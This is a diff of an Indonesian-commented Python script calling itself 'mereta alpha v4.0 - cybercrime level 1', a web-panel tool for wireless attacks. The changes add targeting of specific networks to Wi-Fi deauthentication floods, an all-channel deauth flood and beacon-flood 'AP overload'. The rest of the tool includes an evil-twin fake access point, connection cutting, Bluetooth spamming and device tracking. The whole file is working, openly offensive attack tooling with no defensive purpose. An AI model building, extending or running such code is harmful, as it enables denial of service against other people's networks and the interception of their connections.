@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """
 mereta alpha v4.0 - cybercrime level 1
-full features: mac changer | auto save | attack log | signal meter | evil twin | device tracker | bt scanner | bt spam | export log | realtime graph
+full features: mac changer | auto save | attack log | signal meter | evil twin | device tracker | bt scanner | bt spam | export log
+attack menu dipisah: deauth | all channels | ap overload | bt brutal
 minimalist ui - putih merah - font kurus
 """
 
@@ -13,7 +14,6 @@ import json
 import socket
 import random
 import datetime
-import base64
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 # ============================================
@@ -35,6 +35,9 @@ attack_log = []
 saved_targets = []
 device_tracker_data = {}
 bt_devices = []
+deauth_target = "broadcast"
+allch_target = "broadcast"
+apover_target = "broadcast"
 
 # ============================================
 # mac changer
@@ -110,19 +113,6 @@ def get_signal_strength(ip):
     except:
         pass
     return 0
-
-def get_wifi_signal(ssid):
-    try:
-        networks = scan_wifi_networks()
-        for net in networks:
-            if net.get("ssid") == ssid:
-                sig = net.get("signal", "")
-                if sig and "dBm" in sig:
-                    dbm = int(sig.replace("dBm", ""))
-                    return max(0, min(100, int((dbm + 100) * 1.25)))
-        return 0
-    except:
-        return 0
 
 # ============================================
 # evil twin (ap palsu dengan halaman 404)
@@ -369,34 +359,62 @@ def device_scan():
         devices_found.append({"ip": ip, "type": device_type, "status": "alive"})
     return devices_found
 
-def start_deauth_brutal(duration=60):
+# ============================================
+# ATTACK FUNCTIONS (dengan target bssid)
+# ============================================
+
+def get_bssid_from_ssid(target_ssid):
+    """cari bssid dari ssid target"""
+    networks = scan_wifi_networks()
+    for net in networks:
+        if net.get("ssid") == target_ssid:
+            return net.get("bssid")
+    return "FF:FF:FF:FF:FF:FF"
+
+def start_deauth_brutal(duration=60, target_ssid="broadcast"):
     global attack_running, current_attack
     attack_running = True
     current_attack = "deauth_brutal"
     end = time.time() + duration
-    add_attack_log("deauth_brutal", "broadcast", duration, "started")
+    
+    if target_ssid != "broadcast":
+        bssid = get_bssid_from_ssid(target_ssid)
+        add_attack_log("deauth_brutal", target_ssid, duration, "started")
+    else:
+        bssid = "FF:FF:FF:FF:FF:FF"
+        add_attack_log("deauth_brutal", "broadcast", duration, "started")
+    
     while attack_running and time.time() < end:
         os.system(f"sudo iw dev {interface} set bitrates legacy-2.4 1")
         for _ in range(1000):
-            os.system(f"sudo iw dev {interface} send deauth -c 6 -b ff:ff:ff:ff:ff:ff")
+            os.system(f"sudo iw dev {interface} send deauth -c 6 -b {bssid}")
         time.sleep(0.005)
+    
     if attack_running:
         current_attack = "idle"
-    add_attack_log("deauth_brutal", "broadcast", duration, "completed")
+    add_attack_log("deauth_brutal", target_ssid if target_ssid != "broadcast" else "broadcast", duration, "completed")
 
-def start_all_channels(duration=60):
+def start_all_channels(duration=60, target_ssid="broadcast"):
     global attack_running, current_attack
     attack_running = True
     current_attack = "all_channels"
     end = time.time() + duration
     channels = [1,2,3,4,5,6,7,8,9,10,11]
-    add_attack_log("all_channels", "broadcast", duration, "started")
+    
+    if target_ssid != "broadcast":
+        bssid = get_bssid_from_ssid(target_ssid)
+        add_attack_log("all_channels", target_ssid, duration, "started")
+    else:
+        bssid = "FF:FF:FF:FF:FF:FF"
+        add_attack_log("all_channels", "broadcast", duration, "started")
+    
     def attack_channel(ch):
         while attack_running and time.time() < end:
             os.system(f"sudo iwconfig {interface} channel {ch}")
             for _ in range(500):
-                os.system(f"sudo iw dev {interface} send deauth -c {ch} -b ff:ff:ff:ff:ff:ff")
+                os.system(f"sudo iw dev {interface} send deauth -c {ch} -b {bssid}")
             time.sleep(0.01)
+    
     threads = []
     for ch in channels:
         t = threading.Thread(target=attack_channel, args=(ch,))
@@ -404,21 +422,23 @@ def start_all_channels(duration=60):
         threads.append(t)
     for t in threads: t.join()
     if attack_running: current_attack = "idle"
-    add_attack_log("all_channels", "broadcast", duration, "completed")
+    add_attack_log("all_channels", target_ssid if target_ssid != "broadcast" else "broadcast", duration, "completed")
 
-def start_ap_overload(duration=60):
+def start_ap_overload(duration=60, target_ssid="broadcast"):
     global attack_running, current_attack
     attack_running = True
     current_attack = "ap_overload"
     end = time.time() + duration
     ssids = [f"fake_{i}" for i in range(50)]
-    add_attack_log("ap_overload", "broadcast", duration, "started")
+    
+    add_attack_log("ap_overload", target_ssid if target_ssid != "broadcast" else "broadcast", duration, "started")
+    
     while attack_running and time.time() < end:
         for ssid in ssids:
             os.system(f"sudo iw dev {interface} mgmt beacon -c 6 -s '{ssid}' -w 100")
         time.sleep(0.05)
     if attack_running: current_attack = "idle"
-    add_attack_log("ap_overload", "broadcast", duration, "completed")
+    add_attack_log("ap_overload", target_ssid if target_ssid != "broadcast" else "broadcast", duration, "completed")
 
 def start_bluetooth_brutal(duration=60):
     global attack_running, current_attack, bluetooth_running
@@ -489,90 +509,185 @@ body{background:#fff;font-family:'courier new',monospace;font-weight:300;font-si
 input,select,button{background:#fff;border:1px solid #cc0000;color:#cc0000;padding:3px 6px;font-family:'courier new',monospace;font-size:9px;outline:none;margin:1px;}
 button{cursor:pointer;}
 button:hover{background:#cc0000;color:#fff;}
-.result-area{margin-top:5px;padding:4px;border:1px solid #ffcccc;min-height:35px;max-height:80px;overflow-y:auto;font-size:8px;}
+.result-area{margin-top:5px;padding:4px;border:1px solid #ffcccc;min-height:30px;max-height:80px;overflow-y:auto;font-size:8px;}
 .result-line{color:#cc0000;margin:1px 0;}
 .slider{width:100%;margin:4px 0;}
 .footer{margin-top:10px;padding-top:6px;border-top:1px solid #ffcccc;font-size:8px;}
 .status{color:#cc0000;}
-.signal-bar{display:inline-block;width:20px;background:#eee;border:1px solid #cc0000;margin-left:5px;}
+.signal-bar{display:inline-block;width:40px;background:#eee;border:1px solid #cc0000;margin-left:5px;vertical-align:middle;}
 .signal-fill{height:6px;background:#cc0000;}
+.red{color:#cc0000;}
 </style>
 </head>
 <body>
 <div class="container">
-<div class="header"><div class="title">mereta alpha v4.0</div><div class="subtitle">full features - evil twin - bt spam - tracker</div></div>
+<div class="header">
+<div class="title">mereta alpha v4.0</div>
+<div class="subtitle">full features - evil twin - bt spam - tracker</div>
+</div>
 <div class="warning">[!] extreme danger - total destruction mode</div>
 
-<div class="section"><div class="section-title">> mac changer</div>
+<!-- mac changer -->
+<div class="section">
+<div class="section-title">> mac changer</div>
 <button id="macbtn">change mac</button> current: <span id="currentMac">loading...</span>
-<div id="macResult" class="result-area"></div></div>
+<div id="macResult" class="result-area"></div>
+</div>
 
-<div class="section"><div class="section-title">> auto target save & attack log</div>
-<button id="saveTargetBtn">save selected target</button> <select id="targetSelect"><option value="">pilih target</option></select>
-<button id="viewLogBtn">view attack log</button> <button id="exportLogBtn">export log</button>
-<div id="logResult" class="result-area"></div></div>
+<!-- auto target save & attack log -->
+<div class="section">
+<div class="section-title">> auto target save & attack log</div>
+<button id="saveTargetBtn">save target</button>
+<select id="targetSelect"><option value="">pilih target</option></select>
+<button id="viewLogBtn">view log</button> <button id="exportLogBtn">export log</button>
+<div id="logResult" class="result-area"></div>
+</div>
 
-<div class="section"><div class="section-title">> signal strength meter</div>
-<select id="signalTarget"><option value="">pilih target</option></select> <button id="checkSignalBtn">check signal</button>
-<div id="signalResult" class="result-area"></div></div>
+<!-- signal strength meter -->
+<div class="section">
+<div class="section-title">> signal strength meter</div>
+<select id="signalTarget"><option value="">pilih target</option></select>
+<button id="checkSignalBtn">check signal</button>
+<div id="signalResult" class="result-area"></div>
+</div>
 
-<div class="section"><div class="section-title">> evil twin (ap palsu 404)</div>
+<!-- evil twin -->
+<div class="section">
+<div class="section-title">> evil twin (ap palsu 404)</div>
 <input type="text" id="evilSsid" placeholder="target ssid" style="width:150px;">
-<button id="evilStartBtn">start evil twin</button> <button id="evilStopBtn">stop</button>
-<div id="evilResult" class="result-area"></div></div>
+<button id="evilStartBtn">start</button> <button id="evilStopBtn">stop</button>
+<div id="evilResult" class="result-area"></div>
+</div>
 
-<div class="section"><div class="section-title">> device tracker (real time)</div>
-<button id="trackerBtn">start tracking</button> <button id="trackerStopBtn">stop</button>
-<div id="trackerResult" class="result-area"></div></div>
+<!-- device tracker -->
+<div class="section">
+<div class="section-title">> device tracker (real time)</div>
+<button id="trackerBtn">start tracking</button>
+<div id="trackerResult" class="result-area"></div>
+</div>
 
-<div class="section"><div class="section-title">> bluetooth scanner</div>
+<!-- bluetooth scanner -->
+<div class="section">
+<div class="section-title">> bluetooth scanner</div>
 <button id="btScanBtn">scan bluetooth</button>
-<div id="btScanResult" class="result-area"></div></div>
+<div id="btScanResult" class="result-area"></div>
+</div>
 
-<div class="section"><div class="section-title">> bluetooth spam pairing</div>
+<!-- bluetooth spam pairing -->
+<div class="section">
+<div class="section-title">> bluetooth spam pairing</div>
 <select id="btTargetSelect"><option value="">pilih bt device</option></select>
 <button id="btSpamStartBtn">start spam</button> <button id="btSpamStopBtn">stop spam</button>
-<div id="btSpamResult" class="result-area"></div></div>
+<div id="btSpamResult" class="result-area"></div>
+</div>
 
-<div class="section"><div class="section-title">> netcut (potong koneksi)</div>
+<!-- netcut -->
+<div class="section">
+<div class="section-title">> netcut (potong koneksi)</div>
 <select id="netcutTarget"><option value="">pilih target</option></select>
 <input type="number" id="netcutDuration" placeholder="dur(s)" value="30" style="width:60px;">
 <button id="netcutStart">start</button> <button id="netcutStop">stop</button>
-<div id="netcutStatus" class="result-area">not active</div></div>
+<div id="netcutStatus" class="result-area">not active</div>
+</div>
 
-<div class="section"><div class="section-title">> speed control (geser slider)</div>
+<!-- speed control slider -->
+<div class="section">
+<div class="section-title">> speed control (geser slider)</div>
 <select id="speedTarget"><option value="all">semua device</option></select>
 <input type="range" id="speedSlider" class="slider" min="0" max="10240" step="64" value="0">
 <div>speed: <span id="speedValue">0</span> kbps (<span id="speedMbps">0</span> mbps)</div>
 <button id="speedApply">apply limit</button> <button id="speedRemove">remove limit</button>
-<div id="speedStatus" class="result-area">no limit</div></div>
+<div id="speedStatus" class="result-area">no limit</div>
+</div>
 
-<div class="section"><div class="section-title">> wifi control</div>
+<!-- wifi control -->
+<div class="section">
+<div class="section-title">> wifi control</div>
 <button id="wifionbtn">wifi on</button> <button id="wifioffbtn">wifi off</button> <button id="apbtn">ap mode</button>
-<div id="wifiStatus" class="result-area">checking...</div></div>
+<div id="wifiStatus" class="result-area">checking...</div>
+</div>
 
-<div class="section"><div class="section-title">> add new network</div>
+<!-- add new network -->
+<div class="section">
+<div class="section-title">> add new network</div>
 <input type="text" id="newssid" placeholder="ssid" style="width:120px;">
 <input type="password" id="newpwd" placeholder="password" style="width:100px;">
 <button id="addnetbtn">add</button>
-<div id="addResult" class="result-area"></div></div>
+<div id="addResult" class="result-area"></div>
+</div>
 
-<div class="section"><div class="section-title">> wifi scan</div>
+<!-- wifi scan -->
+<div class="section">
+<div class="section-title">> wifi scan</div>
 <button id="scanbtn">scan</button>
-<div id="scanresult" class="result-area">not scanned</div></div>
+<div id="scanresult" class="result-area">not scanned</div>
+</div>
 
-<div class="section"><div class="section-title">> device scanner</div>
+<!-- device scanner -->
+<div class="section">
+<div class="section-title">> device scanner</div>
 <button id="devscanbtn">scan devices</button>
-<div id="devresult" class="result-area">not scanned</div></div>
+<div id="devresult" class="result-area">not scanned</div>
+</div>
 
-<div class="section"><div class="section-title">> attack menu</div>
-<button id="deauthbtn">deauth brutal</button> <button id="allchbtn">all channels</button>
-<button id="apoverbtn">ap overload</button> <button id="btbtn">bt brutal</button>
-<button id="stopbtn" style="background:#cc0000;color:#fff;">stop all</button>
-<div>duration: <input type="number" id="duration" value="30" min="5" max="300" style="width:60px;"> seconds</div>
-<div id="attackstatus" class="result-area">idle</div></div>
+<!-- ============================================ -->
+<!-- ATTACK MENU - PISAH PER FITUR               -->
+<!-- ============================================ -->
 
-<div class="footer"><span class="status" id="status">ready</span><br><span class="red">*** total destruction mode ***</span></div>
+<!-- 1. deauth brutal -->
+<div class="section">
+<div class="section-title">> deauth brutal</div>
+<div>wifi available:</div>
+<select id="deauthTargetSelect">
+<option value="broadcast">broadcast (semua wifi)</option>
+</select>
+<input type="number" id="deauthDuration" placeholder="dur(s)" value="30" style="width:60px;">
+<button id="deauthStartBtn">start deauth</button>
+<div id="deauthStatus" class="result-area">idle</div>
+</div>
+
+<!-- 2. all channels -->
+<div class="section">
+<div class="section-title">> all channels</div>
+<div>wifi available:</div>
+<select id="allchTargetSelect">
+<option value="broadcast">broadcast (semua wifi)</option>
+</select>
+<input type="number" id="allchDuration" placeholder="dur(s)" value="30" style="width:60px;">
+<button id="allchStartBtn">start all channels</button>
+<div id="allchStatus" class="result-area">idle</div>
+</div>
+
+<!-- 3. ap overload -->
+<div class="section">
+<div class="section-title">> ap overload</div>
+<div>wifi available:</div>
+<select id="apoverTargetSelect">
+<option value="broadcast">broadcast (semua wifi)</option>
+</select>
+<input type="number" id="apoverDuration" placeholder="dur(s)" value="30" style="width:60px;">
+<button id="apoverStartBtn">start ap overload</button>
+<div id="apoverStatus" class="result-area">idle</div>
+</div>
+
+<!-- 4. bluetooth brutal -->
+<div class="section">
+<div class="section-title">> bluetooth brutal</div>
+<input type="number" id="btDuration" placeholder="dur(s)" value="30" style="width:60px;">
+<button id="btStartBtn">start bt brutal</button> <button id="btStopBtn">stop bt brutal</button>
+<div id="btStatus" class="result-area">idle</div>
+</div>
+
+<!-- stop all attacks -->
+<div class="section">
+<button id="stopAllBtn" style="background:#cc0000;color:#fff;">stop all attacks</button>
+<div id="stopResult" class="result-area"></div>
+</div>
+
+<div class="footer">
+<span class="status" id="status">ready</span><br>
+<span class="red">*** total destruction mode ***</span>
+</div>
 </div>
 
 <script>
@@ -595,29 +710,51 @@ async function loadDevices() {
     }
 }
 
+async function loadWifiNetworks() {
+    const data = await fetchJson('/api/scan');
+    if(data.networks && data.networks.length) {
+        let html = '<option value="broadcast">broadcast (semua wifi)</option>';
+        for(let n of data.networks) {
+            if(n.ssid && n.ssid != "") html += `<option value="${n.ssid}">${n.ssid}</option>`;
+        }
+        document.getElementById('deauthTargetSelect').innerHTML = html;
+        document.getElementById('allchTargetSelect').innerHTML = html;
+        document.getElementById('apoverTargetSelect').innerHTML = html;
+        let scanHtml = `<div class="result-line">${data.networks.length} networks:</div>`;
+        for(let n of data.networks.slice(0,8)) {
+            if(n.ssid && n.ssid != "") scanHtml += `<div class="result-line">> ${n.ssid}</div>`;
+        }
+        document.getElementById('scanresult').innerHTML = scanHtml;
+    }
+}
+
 document.getElementById('macbtn').onclick = async () => {
     const data = await fetchJson('/api/mac/change');
     document.getElementById('macResult').innerHTML = `<div class="result-line">new mac: ${data.mac}</div>`;
     document.getElementById('currentMac').innerText = data.current;
 };
+
 document.getElementById('saveTargetBtn').onclick = async () => {
     const target = document.getElementById('targetSelect').value;
     if(!target) return alert('pilih target');
     await fetch(`/api/target/save?ip=${target}`);
     document.getElementById('logResult').innerHTML = '<div class="result-line">target saved</div>';
 };
+
 document.getElementById('viewLogBtn').onclick = async () => {
     const data = await fetchJson('/api/log/view');
     if(data.log && data.log.length) {
         let html = '';
-        for(let l of data.log.slice(-10)) html += `<div class="result-line">${l.time} - ${l.attack} -> ${l.target} (${l.duration}s)</div>`;
+        for(let l of data.log.slice(-10)) html += `<div class="result-line">${l.time.substring(5,16)} - ${l.attack} -> ${l.target} (${l.duration}s)</div>`;
         document.getElementById('logResult').innerHTML = html;
     } else document.getElementById('logResult').innerHTML = '<div class="result-line">no logs</div>';
 };
+
 document.getElementById('exportLogBtn').onclick = async () => {
     const data = await fetchJson('/api/log/export');
     document.getElementById('logResult').innerHTML = `<div class="result-line">exported: ${data.file}</div>`;
 };
+
 document.getElementById('checkSignalBtn').onclick = async () => {
     const target = document.getElementById('signalTarget').value;
     if(!target) return;
@@ -625,28 +762,34 @@ document.getElementById('checkSignalBtn').onclick = async () => {
     const signal = data.signal;
     document.getElementById('signalResult').innerHTML = `<div class="result-line">signal: ${signal}% <div class="signal-bar"><div class="signal-fill" style="width:${signal}%"></div></div></div>`;
 };
+
 document.getElementById('evilStartBtn').onclick = async () => {
     const ssid = document.getElementById('evilSsid').value;
     if(!ssid) return;
     await fetch(`/api/evil/start?ssid=${ssid}`);
     document.getElementById('evilResult').innerHTML = '<div class="result-line">evil twin active for: ' + ssid + '</div>';
 };
+
 document.getElementById('evilStopBtn').onclick = async () => {
     await fetch('/api/evil/stop');
     document.getElementById('evilResult').innerHTML = '<div class="result-line">evil twin stopped</div>';
 };
-document.getElementById('trackerBtn').onclick = async () => {
-    setInterval(async () => {
+
+let trackerInterval = null;
+document.getElementById('trackerBtn').onclick = () => {
+    if(trackerInterval) clearInterval(trackerInterval);
+    trackerInterval = setInterval(async () => {
         const data = await fetchJson('/api/tracker');
         if(data.trackers) {
             let html = '';
             for(let [ip, info] of Object.entries(data.trackers)) {
-                html += `<div class="result-line">${ip} - signal:${info.signal}% - last:${info.last_seen.substring(0,16)}</div>`;
+                html += `<div class="result-line">${ip} - signal:${info.signal}% - last:${info.last_seen.substring(11,16)}</div>`;
             }
-            document.getElementById('trackerResult').innerHTML = html;
+            document.getElementById('trackerResult').innerHTML = html || '<div class="result-line">no devices tracked</div>';
         }
     }, 3000);
 };
+
 document.getElementById('btScanBtn').onclick = async () => {
     const data = await fetchJson('/api/bt/scan');
     if(data.devices && data.devices.length) {
@@ -654,32 +797,40 @@ document.getElementById('btScanBtn').onclick = async () => {
         for(let d of data.devices) html += `<div class="result-line">${d.mac} - ${d.name}</div>`;
         document.getElementById('btScanResult').innerHTML = html;
         let opts = '<option value="">pilih bt device</option>';
-        for(let d of data.devices) opts += `<option value="${d.mac}">${d.mac} (${d.name})</option>`;
+        for(let d of data.devices) opts += `<option value="${d.mac}">${d.mac} (${d.name.substring(0,20)})</option>`;
         document.getElementById('btTargetSelect').innerHTML = opts;
     } else document.getElementById('btScanResult').innerHTML = '<div class="result-line">no bt devices</div>';
 };
+
 document.getElementById('btSpamStartBtn').onclick = async () => {
     const mac = document.getElementById('btTargetSelect').value;
     if(!mac) return;
     await fetch(`/api/bt/spam/start?mac=${mac}`);
     document.getElementById('btSpamResult').innerHTML = '<div class="result-line">spamming: ' + mac + '</div>';
 };
+
 document.getElementById('btSpamStopBtn').onclick = async () => {
     await fetch('/api/bt/spam/stop');
     document.getElementById('btSpamResult').innerHTML = '<div class="result-line">spam stopped</div>';
 };
+
 document.getElementById('netcutStart').onclick = async () => {
     const target = document.getElementById('netcutTarget').value;
     const dur = document.getElementById('netcutDuration').value;
     if(!target) return;
     await fetch(`/api/netcut/start?target=${target}&duration=${dur}`);
     document.getElementById('netcutStatus').innerHTML = `<div class="result-line">netcut active: ${target} (${dur}s)</div>`;
-    setTimeout(() => document.getElementById('netcutStatus').innerHTML = '<div class="result-line">not active</div>', dur*1000);
+    setTimeout(() => {
+        fetch('/api/netcut/stop');
+        document.getElementById('netcutStatus').innerHTML = '<div class="result-line">not active</div>';
+    }, dur*1000);
 };
+
 document.getElementById('netcutStop').onclick = async () => {
     await fetch('/api/netcut/stop');
     document.getElementById('netcutStatus').innerHTML = '<div class="result-line">netcut stopped</div>';
 };
+
 const slider = document.getElementById('speedSlider');
 slider.oninput = () => {
     let val = slider.value;
@@ -697,23 +848,22 @@ document.getElementById('speedRemove').onclick = async () => {
     document.getElementById('speedStatus').innerHTML = '<div class="result-line">no limit</div>';
     slider.value = 0;
 };
+
 document.getElementById('wifionbtn').onclick = async () => { await fetch('/api/wifi/on'); document.getElementById('wifiStatus').innerHTML = '<div class="result-line">wifi on</div>'; };
 document.getElementById('wifioffbtn').onclick = async () => { await fetch('/api/wifi/off'); document.getElementById('wifiStatus').innerHTML = '<div class="result-line">wifi off</div>'; };
-document.getElementById('apbtn').onclick = async () => { await fetch('/api/ap'); document.getElementById('wifiStatus').innerHTML = '<div class="result-line">ap mode: MERETA</div>'; };
+document.getElementById('apbtn').onclick = async () => { await fetch('/api/ap'); document.getElementById('wifiStatus').innerHTML = '<div class="result-line">ap mode: MERETA (12345678)</div>'; };
+
 document.getElementById('addnetbtn').onclick = async () => {
     const ssid = document.getElementById('newssid').value, pwd = document.getElementById('newpwd').value;
     if(!ssid || !pwd) return;
     const data = await fetchJson('/api/add', {method:'POST', body:JSON.stringify({ssid, pwd})});
     document.getElementById('addResult').innerHTML = `<div class="result-line">${data.status}</div>`;
 };
+
 document.getElementById('scanbtn').onclick = async () => {
-    const data = await fetchJson('/api/scan');
-    if(data.networks?.length) {
-        let html = `<div class="result-line">${data.networks.length} networks:</div>`;
-        for(let n of data.networks.slice(0,10)) html += `<div class="result-line">> ${n.ssid} - ${n.bssid}</div>`;
-        document.getElementById('scanresult').innerHTML = html;
-    } else document.getElementById('scanresult').innerHTML = '<div class="result-line">no networks</div>';
+    await loadWifiNetworks();
 };
+
 document.getElementById('devscanbtn').onclick = async () => {
     document.getElementById('devresult').innerHTML = '<div class="result-line">scanning...</div>';
     const data = await fetchJson('/api/devices');
@@ -724,21 +874,75 @@ document.getElementById('devscanbtn').onclick = async () => {
         await loadDevices();
     } else document.getElementById('devresult').innerHTML = '<div class="result-line">no devices</div>';
 };
-const durInp = document.getElementById('duration');
-document.getElementById('deauthbtn').onclick = async () => { await fetch(`/api/attack/deauth?duration=${durInp.value}`); document.getElementById('attackstatus').innerHTML = '<div class="result-line red">deauth active</div>'; };
-document.getElementById('allchbtn').onclick = async () => { await fetch(`/api/attack/allchannels?duration=${durInp.value}`); document.getElementById('attackstatus').innerHTML = '<div class="result-line red">all channels active</div>'; };
-document.getElementById('apoverbtn').onclick = async () => { await fetch(`/api/attack/apoverload?duration=${durInp.value}`); document.getElementById('attackstatus').innerHTML = '<div class="result-line red">ap overload active</div>'; };
-document.getElementById('btbtn').onclick = async () => { await fetch(`/api/attack/bluetooth?duration=${durInp.value}`); document.getElementById('attackstatus').innerHTML = '<div class="result-line red">bt brutal active</div>'; };
-document.getElementById('stopbtn').onclick = async () => { await fetch('/api/stop'); document.getElementById('attackstatus').innerHTML = '<div class="result-line">idle</div>'; };
+
+// ========== DEAUTH ==========
+document.getElementById('deauthStartBtn').onclick = async () => {
+    const target = document.getElementById('deauthTargetSelect').value;
+    const dur = document.getElementById('deauthDuration').value;
+    await fetch(`/api/attack/deauth?duration=${dur}&target=${encodeURIComponent(target)}`);
+    document.getElementById('deauthStatus').innerHTML = `<div class="result-line red">deauth active: ${target} (${dur}s)</div>`;
+    setTimeout(() => {
+        document.getElementById('deauthStatus').innerHTML = '<div class="result-line">idle</div>';
+    }, dur*1000);
+};
+
+// ========== ALL CHANNELS ==========
+document.getElementById('allchStartBtn').onclick = async () => {
+    const target = document.getElementById('allchTargetSelect').value;
+    const dur = document.getElementById('allchDuration').value;
+    await fetch(`/api/attack/allchannels?duration=${dur}&target=${encodeURIComponent(target)}`);
+    document.getElementById('allchStatus').innerHTML = `<div class="result-line red">all channels active: ${target} (${dur}s)</div>`;
+    setTimeout(() => {
+        document.getElementById('allchStatus').innerHTML = '<div class="result-line">idle</div>';
+    }, dur*1000);
+};
+
+// ========== AP OVERLOAD ==========
+document.getElementById('apoverStartBtn').onclick = async () => {
+    const target = document.getElementById('apoverTargetSelect').value;
+    const dur = document.getElementById('apoverDuration').value;
+    await fetch(`/api/attack/apoverload?duration=${dur}&target=${encodeURIComponent(target)}`);
+    document.getElementById('apoverStatus').innerHTML = `<div class="result-line red">ap overload active: ${target} (${dur}s)</div>`;
+    setTimeout(() => {
+        document.getElementById('apoverStatus').innerHTML = '<div class="result-line">idle</div>';
+    }, dur*1000);
+};
+
+// ========== BLUETOOTH BRUTAL ==========
+document.getElementById('btStartBtn').onclick = async () => {
+    const dur = document.getElementById('btDuration').value;
+    await fetch(`/api/attack/bluetooth?duration=${dur}`);
+    document.getElementById('btStatus').innerHTML = `<div class="result-line red">bt brutal active (${dur}s)</div>`;
+    setTimeout(() => {
+        document.getElementById('btStatus').innerHTML = '<div class="result-line">idle</div>';
+    }, dur*1000);
+};
+
+document.getElementById('btStopBtn').onclick = async () => {
+    await fetch('/api/stop');
+    document.getElementById('btStatus').innerHTML = '<div class="result-line">stopped</div>';
+};
+
+// ========== STOP ALL ==========
+document.getElementById('stopAllBtn').onclick = async () => {
+    await fetch('/api/stop');
+    document.getElementById('stopResult').innerHTML = '<div class="result-line">all attacks stopped</div>';
+    document.getElementById('deauthStatus').innerHTML = '<div class="result-line">idle</div>';
+    document.getElementById('allchStatus').innerHTML = '<div class="result-line">idle</div>';
+    document.getElementById('apoverStatus').innerHTML = '<div class="result-line">idle</div>';
+    document.getElementById('btStatus').innerHTML = '<div class="result-line">idle</div>';
+    document.getElementById('netcutStatus').innerHTML = '<div class="result-line">not active</div>';
+    document.getElementById('evilResult').innerHTML = '<div class="result-line">evil twin stopped</div>';
+};
 
 async function updateStatus() {
     const data = await fetchJson('/api/status');
-    document.getElementById('attackstatus').innerHTML = data.current_attack === 'idle' ? '<div class="result-line">idle</div>' : `<div class="result-line red">${data.current_attack} active</div>`;
     const mac = await fetchJson('/api/mac/current');
     document.getElementById('currentMac').innerText = mac.mac;
 }
 setInterval(updateStatus, 3000);
 loadDevices();
+loadWifiNetworks();
 updateStatus();
 </script>
 </body>
@@ -821,15 +1025,18 @@ class handler(BaseHTTPRequestHandler):
             self.send_json({'devices': devs})
         elif self.path.startswith('/api/attack/deauth'):
             dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
-            threading.Thread(target=start_deauth_brutal, args=(dur,)).start()
+            target = self.path.split('target=')[1].split('&')[0] if 'target=' in self.path else 'broadcast'
+            threading.Thread(target=start_deauth_brutal, args=(dur, target)).start()
             self.send_json({'status': 'started'})
         elif self.path.startswith('/api/attack/allchannels'):
             dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
-            threading.Thread(target=start_all_channels, args=(dur,)).start()
+            target = self.path.split('target=')[1].split('&')[0] if 'target=' in self.path else 'broadcast'
+            threading.Thread(target=start_all_channels, args=(dur, target)).start()
             self.send_json({'status': 'started'})
         elif self.path.startswith('/api/attack/apoverload'):
             dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
-            threading.Thread(target=start_ap_overload, args=(dur,)).start()
+            target = self.path.split('target=')[1].split('&')[0] if 'target=' in self.path else 'broadcast'
+            threading.Thread(target=start_ap_overload, args=(dur, target)).start()
             self.send_json({'status': 'started'})
         elif self.path.startswith('/api/attack/bluetooth'):
             dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
@@ -858,11 +1065,16 @@ if __name__ == '__main__':
     print('║              mereta alpha v4.0                ║')
     print('║    cybercrime level 1 - full features         ║')
     print('║  mac changer | evil twin | bt spam | tracker  ║')
+    print('║     attack menu: deauth | all channels | ap overload | bt brutal    ║')
     print('╚════════════════════════════════════════════╝\033[0m')
     os.system(f"sudo ifconfig {interface} up 2>/dev/null")
     local_ip = get_ip()
     print(f'\n\033[91m[!]\033[0m server: http://{local_ip}:8080')
-    print(f'\033[91m[!]\033[0m fitur: mac changer | auto save | attack log | signal meter | evil twin | device tracker | bt scanner | bt spam | export log')
+    print(f'\n\033[91m[!]\033[0m attack menu:')
+    print(f'\033[91m    - deauth brutal: pilih target wifi dari dropdown')
+    print(f'\033[91m    - all channels: pilih target wifi')
+    print(f'\033[91m    - ap overload: pilih target wifi')
+    print(f'\033[91m    - bluetooth brutal: start/stop terpisah')
     print(f'\033[91m[!]\033[0m press ctrl+c to stop\n')
     server = HTTPServer(('0.0.0.0', 8080), handler)
     try: server.serve_forever()
